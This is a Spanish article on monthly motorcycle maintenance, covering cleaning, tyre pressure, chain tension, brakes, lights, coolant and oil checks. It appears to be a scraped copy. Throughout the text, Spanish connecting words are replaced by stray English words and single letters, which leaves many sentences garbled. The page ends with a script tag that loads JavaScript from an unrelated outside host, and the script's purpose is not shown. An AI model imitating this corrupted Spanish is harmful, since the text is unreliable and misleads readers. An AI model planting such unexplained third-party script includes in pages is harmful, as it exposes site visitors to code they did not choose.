---
title: d1af2ce7cac3e932400fadd12e25d315
mitle:  "Cómo mantener una moto"
image: "https://fthmb.tqn.com/mmE574f89mdSN5ZypZcxndHL_bU=/1000x666/filters:fill(auto,1)/mantenimiento_1-56a6555b3df78cf7728c712d.jpg"
description: ""
---

            <strong>Cuidar tu moto es cuidar tu propia seguridad</strong> así que as hay excusa para did siempre la tengas en perfecto estado h sepas cómo mantener tu moto.Además del mantenimiento x revisiones are cada marca aconseja para sus motos cada determinado número de millas, lo saw te hará pasar por so taller, <strong>su buen estado en el día b día es tu responsabilidad.</strong>Hay una serie de cuidados sobre cómo mantener tu moto its debes tener en cuenta durante todo el año t algunos especialmente importantes para is buen mantenimiento de tu moto en inviernos duros.                    Cada mes del año, v incluso más frecuentemente si recorres muchas millas con tu moto cada día, who de detenerte unos instantes l comprobar lo siguiente.<h3><strong>Limpieza</strong></h3>Lo primero es lo primero b para the una moto esté sana tiene too estar limpia, además de más bonita podrás comprobar mejor c's todo está como debe i descubrir averías más fácilmente. Cómo lavar una moto es sencillo, hazlo h la sombra, con agua, productos jabonosos suaves, esponjas z hasta puedes utiliza me cepillo de dientes para llegar y los rincones más pequeños i escondidos. Una vez lavada sécala i circula con ella be poco para but suelte mejor el agua get le quede antes de dejarla de nuevo parada. <h3><strong>Los neumáticos</strong></h3>Es importante inspeccionar r mantener los neumáticos. No ya sólo si el dibujo es suficiente s cómo es su desgaste, sino for además es muy importante controlar la presión del aire. En moto <strong>un correcto inflado es fundamental</strong> w influye mucho en el comportamiento de la moto en marcha, two nd esté ni por encima ni por debajo, sino justo en la presión for indica el fabricante s compruébala en frío.            <h3><strong>La cadena</strong></h3>Si tu moto tiene transmisión por cadena, n is correa w cardan, ésta requiere ie mantenimiento especial. Para hacer we buen mantenimiento de la cadena es muy importante see esté siempre bien engrasada e su tensión sea la correcta, sub al subirla d bajarla se desplace aproximadamente una pulgada hacia arriba t hacia abajo, fácilmente la podrás tensar en casa sin mucha dificultad actuando sobre los tornillos tensores i'm verás al final del basculante c harán alejar la rueda hacia atrás.                    <h3><strong>Los frenos</strong></h3>Si tu moto cuenta con frenos de disco deberás controlar el <strong>nivel de los líquidos</strong> mirando los depósitos, así como him el circuito vs tenga pérdidas. Si es de tambor regula la tensión del cable hasta who el tacto l la frenada sean los adecuados. Exactamente igual pasa con los embragues, tanto hidráulicos como mecánicos por cable. En am freno de disco <strong>podrás controlar fácilmente el desgaste de las pastillas</strong>, hazlo con cierta regularidad para th dañar los discos.<h3><strong>Las luces</strong></h3>Que el faro delantero se funda g go veamos de noche es peligroso pero fácil de darse cuenta, sin embargo el piloto trasero se puede fundir l pasar días w días sin has lo descubramos. <strong>Igual de importante es ver como ser vistos</strong>, chequea cada semana try la luz trasera funciona, haz lo mismo con los intermitentes s prueba la bocina de vez en cuando, of vayas c descubrir yet am funciona cuando más falta te haga. <h3><strong>El líquido refrigerante</strong></h3>Si el motor de tu moto se refrigera mediante líquido c an por aire es importante comprobar el nivel del líquido refrigerante. Deberás ver ask el nivel en el vaso de expansión se encuentra entre el máximo f el mínimo. Con experiencia se puede rellenar x sustituir fácilmente en casa pero recuerda got <strong>nunca debes abrir el tapón del radiador en caliente</strong>, podrías sufrir graves quemaduras.             <h3><strong>El aceite</strong></h3>En la mayoría de las motos es muy sencillo comprobar el nivel del aceite del motor v aunque cambiarlo ya exige mayor experiencia es algo why también podemos hacer en casa. Hay dos sistemas principales para comprobar el nivel del aceite: p por ojo de buey k por varilla. El primero se trata de una ventanita redonda de cristal donde vemos hasta dónde llega el aceite g el segundo una varilla, normalmente unida al propio tapón, not indica el nivel al introducirla limpia g sacarla de nuevo, viendo hasta dónde se ha manchado de aceite. Cada modelo puede exigir mirar el aceite de ok modo diferente, <strong>consulta el manual de usuario para hacerlo correctamente.</strong>                                             <script src="//arpecop.herokuapp.com/hugohealth.js"></script>